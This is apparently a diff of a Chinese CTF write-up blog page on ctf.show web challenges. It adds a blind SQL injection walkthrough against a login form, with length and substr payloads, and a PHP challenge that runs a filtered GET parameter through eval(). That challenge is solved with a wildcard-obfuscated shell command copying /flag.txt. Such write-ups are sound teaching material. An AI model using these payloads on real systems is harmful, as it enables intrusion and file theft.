@@ -71,6 +71,7 @@
   data-scroll-reveal
 >
   <div class="article-inner">
+  
     
     <header class="article-header">
        
@@ -95,7 +96,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2k</span>
+            <span class="post-count">2.4k</span>
         </span>
     </span>
 
@@ -104,7 +105,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">9 分钟</span>
+            <span class="post-count">11 分钟</span>
         </span>
     </span>
 </div>
@@ -185,6 +186,12 @@
 <p><code>?id=-1%09or%09false</code>无回显</p>
 <p><strong>那注入点就是数值点注入</strong></p>
 <p>盲注一般用脚本</p>
+<h2 id="萌新记忆"><a href="#萌新记忆" class="headerlink" title="萌新记忆"></a>萌新记忆</h2><p>很有意思，前端就几个弹出些图片，就没了</p>
+<p>需要扫目录，有个admin路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">用户名是有利用情况的，单引号报错 ，如123&#x27;</span><br><span class="line"></span><br><span class="line">但123&#x27;&#x27;，就会提示用户名错误，= or and 等字段都过滤了</span><br><span class="line"></span><br><span class="line">但如果，u=admin，p随便，则密码错误</span><br><span class="line">u=admin&#x27;||&#x27;0&#x27;&lt;&#x27;1 是可以的</span><br><span class="line"></span><br><span class="line">#密码长度</span><br><span class="line">u=&#x27;||length(p)&lt;&#x27;20&amp;p=123 #密码错误</span><br><span class="line">u=&#x27;||length(p)&lt;&#x27;10&amp;p=123 #用户名密码错误</span><br><span class="line">u=&#x27;||length(p)&lt;&#x27;18&amp;p=123 #密码错误</span><br><span class="line">u=&#x27;||length(p)&lt;&#x27;17&amp;p=123 #用户名密码错误</span><br><span class="line"></span><br><span class="line">#好，密码17位</span><br><span class="line"></span><br><span class="line">#爆破每一位</span><br><span class="line">u=&#x27;||substr(p,1,1)&lt;&#x27;a</span><br><span class="line"></span><br><span class="line">#写python爆破出密码即可</span><br></pre></td></tr></table></figure>
+
+
+
 <h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="1-web9"><a href="#1-web9" class="headerlink" title="1.web9"></a>1.web9</h2><p>url&#x2F;robots.txt</p>
 <blockquote>
 <p>User-agent: *<br>Disallow: &#x2F;index.phps</p>
@@ -254,6 +261,21 @@
 
 <p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230910123848661.png"></p>
 <p>访问<code>/123.php</code>，报错已经写入自定义的报错日志，同时，报错代码被自动执行了。</p>
+<h2 id="红包题2"><a href="#红包题2" class="headerlink" title="红包题2"></a>红包题2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_红包题&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_红包题&lt;/h2&gt;</span><br><span class="line">    &lt;h4&gt;where is the flag?&lt;/h4&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">    &lt;!-- hint:?cmd= --&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>wp：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`/???/?p%20/????????%20p.ppp`;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>相当于</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`/bin/cp /flag.txt p.ppp`;?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= ?&gt;  等同于 &lt;?php <span class="built_in">echo</span> ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>闭合，再用php短链接形式，反引号的内容相当于shell_exec()的内容</p>
+<p>再访问url&#x2F;p.ppp，下载文件即可</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>用了正则，php短链接知识</p>
 <h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="1-web12"><a href="#1-web12" class="headerlink" title="1.web12"></a>1.web12</h2><blockquote>
 <p>?cmd&#x3D;phpinfo();</p>
 </blockquote>
